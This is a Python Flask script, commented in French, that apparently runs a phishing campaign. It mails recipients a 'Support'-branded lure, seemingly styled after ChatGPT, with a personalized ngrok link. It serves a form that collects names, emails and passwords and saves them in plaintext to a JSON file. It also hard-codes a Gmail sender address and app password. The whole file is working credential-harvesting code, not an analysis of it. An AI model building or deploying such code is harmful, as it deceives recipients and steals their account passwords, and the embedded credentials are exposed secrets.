from flask import Flask, render_template, request, jsonify
import json
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
import datetime

app = Flask(__name__)

# ================= CONFIG =================
DATA_FILE = "inscriptions.json"

SYSTEM_EMAIL = "lynl56794@gmail.com"
SYSTEM_PASS = "qenihpggnbhlljde"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

FORM_LINK_BASE = "https://gayla-denotive-crew.ngrok-free.dev"

DESTINATAIRES = [
    "lynaarezki19@gmail.com",
   
   
    
]
# ==========================================


# ========= GESTION DES DONNÉES ===========
def charger_donnees():
    if not os.path.exists(DATA_FILE):
        return []

    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = f.read().strip()
            if not data:
                return []

            contenu = json.loads(data)

            # 🔥 Sécurité : si c'est un dict au lieu d'une liste
            if isinstance(contenu, dict):
                return []

            return contenu

    except Exception as e:
        print("⚠️ Erreur lecture JSON :", e)
        return []


def sauvegarder_donnees(donnees):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(donnees, f, indent=2)
# ==========================================


# ============ ENVOI EMAIL =================
def envoyer_emails():
    try:
        serveur = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        serveur.starttls()
        serveur.login(SYSTEM_EMAIL, SYSTEM_PASS)

        for destinataire in DESTINATAIRES:
            try:
                lien_perso = f"{FORM_LINK_BASE}?email={destinataire}"

                message = MIMEMultipart()
                message["From"] = formataddr(("Support", SYSTEM_EMAIL))
                message["To"] = destinataire
                message["Subject"] = "BIEN JOUÉ ! Remplis le formulaire pour continuer"

                with open("email_chatgpt_simple.html", "r", encoding="utf-8") as f:
                    html_template = f.read()

                corps_html = html_template.replace(
                    "LIEN_PERSONNALISE_ICI", lien_perso
                )

                message.attach(MIMEText(corps_html, "html"))

                serveur.send_message(message)
                print(f"✓ Email envoyé à {destinataire}")

            except Exception as e:
                print(f"✗ Erreur pour {destinataire} :", e)

        serveur.quit()
        print("✓ Tous les emails envoyés")

    except Exception as e:
        print("✗ Erreur SMTP :", e)
# ==========================================


# ================= ROUTES =================
@app.route("/")
def index():
    email = request.args.get("email", "")
    return render_template("formulaire.html", email=email)


@app.route("/submit", methods=["POST"])
def submit_form():
    try:
        data = request.json

        if not data:
            return jsonify({"success": False, "message": "Aucune donnée reçue"}), 400

        required_fields = ["nom", "prenom", "email", "mdps"]

        if not all(field in data for field in required_fields):
            return jsonify({"success": False, "message": "Champs manquants"}), 400

        inscriptions = charger_donnees()

        nouvelle_inscription = {
            "nom": data["nom"],
            "prenom": data["prenom"],
            "email": data["email"],
            "mdps": data["mdps"],
            "timestamp": str(datetime.datetime.now()),
        }

        inscriptions.append(nouvelle_inscription)
        sauvegarder_donnees(inscriptions)

        print(
            f"✓ Formulaire rempli par {data['prenom']} {data['nom']} ({data['email']})"
        )

        return jsonify({"success": True}), 200

    except Exception as e:
        print("✗ Erreur submit :", e)
        return jsonify({"success": False, "message": str(e)}), 500


@app.route("/send-emails")
def send_emails_route():
    envoyer_emails()
    return jsonify({"success": True})
# ==========================================


# ================= MAIN ===================
if __name__ == "__main__":
    print("🌐 Serveur lancé sur http://localhost:5000")
    if os.environ.get("WERKZEUG_RUN_MAIN") == "true":
        envoyer_emails()

    app.run(debug=True, port=5000)